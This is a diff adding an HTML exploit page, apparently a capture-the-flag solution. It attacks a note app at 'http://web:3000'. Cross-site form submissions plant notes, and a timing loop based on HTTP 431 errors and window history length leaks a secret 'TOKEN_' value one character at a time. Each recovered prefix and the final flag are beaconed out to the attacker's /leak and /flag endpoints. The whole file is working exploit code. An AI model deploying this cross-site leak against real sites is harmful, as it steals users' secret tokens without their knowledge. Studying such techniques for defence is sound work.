@@ -1,0 +1,177 @@
+<body>
+  <form id="create" action="..." method="post" target="csrf">
+    <input type="text" name="note" />
+  </form>
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+    const CHARS = [..."0123456789abcdef"];
+    const TOKEN_LEN = "TOKEN_".length + 12;
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+    const debug = (o) => navigator.sendBeacon("/debug", JSON.stringify(o));
+
+    const knownParam = new URLSearchParams(location.search).get("known");
+    let known = knownParam?.startsWith("TOKEN_") ? knownParam : "TOKEN_";
+
+    open("about:blank", "csrf");
+
+    const createNote = async (note) => {
+      const form = document.forms[0];
+      form.method = "post";
+      form.action = `${BASE_URL}/new`;
+      form.note.value = note;
+      form.submit();
+      await sleep(180);
+    };
+
+    const visitRoot = async () => {
+      open(`${BASE_URL}/?r=${Math.random()}`, "csrf");
+      await sleep(180);
+    };
+
+    const prepared = new Set();
+    let safePad = 0;
+
+    const prepareCompare = async (guess) => {
+      if (prepared.has(guess)) return;
+      prepared.add(guess);
+
+      await createNote(`${guess} |`);
+      await createNote("");
+    };
+
+    const CLEANUP_QUOTES = 12;
+    const CLEANUP_INCREASE = 29;
+
+    const cleanupFalseGuess = async () => {
+      await createNote(`|${'"'.repeat(CLEANUP_QUOTES)}`);
+      await createNote("");
+      for (let i = 0; i < CLEANUP_QUOTES; i++) {
+        await visitRoot();
+      }
+      safePad -= CLEANUP_INCREASE;
+      debug({ type: "cleanup", safePad });
+    };
+
+    // The following 431 oracle is based on https://blog.arkark.dev/2025/12/26/etag-length-leak
+
+    let win = open("about:blank");
+
+    const getUrl = (label, padLength, nonce) =>
+      `${BASE_URL}/?${new URLSearchParams({
+        q: label,
+        pad: nonce.padEnd(Math.max(0, padLength), "x"),
+      })}`;
+
+    const detect431 = async (label, padLength) => {
+      const nonce = (Math.random() + "").padEnd(20, "0");
+      const url = getUrl(label, padLength, nonce);
+      const len1 = win.history.length;
+
+      win.location = url;
+      await sleep(120);
+      win.location = url;
+      await sleep(120);
+      win.location = "about:blank";
+      await sleep(120);
+
+      const len2 = win.history.length;
+      const diff = len2 - len1;
+
+      if (len2 > 45) {
+        win.close();
+        win = open("about:blank");
+        await sleep(120);
+      }
+
+      debug({ type: "detect", label, padLength, len1, len2, diff });
+      return diff === 2;
+    };
+
+    const getSafePad = async (label) => {
+      // Re-calibrate every time because previous probes keep growing the cookie.
+      let left = 10_000;
+      let right = 18_000;
+
+      while (!(await detect431(label, right))) right += 1_000;
+      while (await detect431(label, left)) left -= 1_000;
+
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+        if (await detect431(label, mid)) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+      return left;
+    };
+
+    const shortIncrease = (guess) => {
+      // sanitize(`<article>${guess} |</article>`)
+      return guess.length + 41;
+    };
+
+    const realGreaterThanGuess = async (guess, updateSafePad = true) => {
+      const increase = shortIncrease(guess);
+
+      await prepareCompare(guess);
+
+      const pad = safePad - increase;
+      const result = await detect431(guess, pad);
+      debug({ type: "oracle", guess, safePad, increase, pad, result });
+      if (updateSafePad) {
+        safePad -= increase + (result ? 1 : 0);
+      }
+      return result;
+    };
+
+    const leakNextChar = async () => {
+      let left = 0;
+      let right = CHARS.length - 1;
+      let next = CHARS[0];
+      let firstFalse = CHARS[CHARS.length - 1];
+
+      while (left <= right) {
+        const mid = (left + right) >> 1;
+        const guess = known + CHARS[mid];
+
+        if (await realGreaterThanGuess(guess)) {
+          next = CHARS[mid];
+          left = mid + 1;
+        } else {
+          firstFalse = CHARS[mid];
+          right = mid - 1;
+          if (left <= right || known.length + 1 < TOKEN_LEN) {
+            await cleanupFalseGuess();
+          }
+        }
+      }
+      return next;
+    };
+
+    const main = async () => {
+      debug({ type: "start", known });
+
+      while (known.length < TOKEN_LEN) {
+        safePad = await getSafePad(`${known}g`);
+        debug({ type: "calibrate", known, safePad });
+        const next = await leakNextChar();
+        known += next;
+        safePad -= 1;
+        navigator.sendBeacon("/leak", known);
+        debug({ type: "known", known });
+      }
+
+      navigator.sendBeacon("/flag", known);
+    };
+
+    main().catch((e) => {
+      debug({
+        type: "error",
+        message: String(e),
+        stack: e?.stack,
+      });
+    });
+  </script>
+</body>
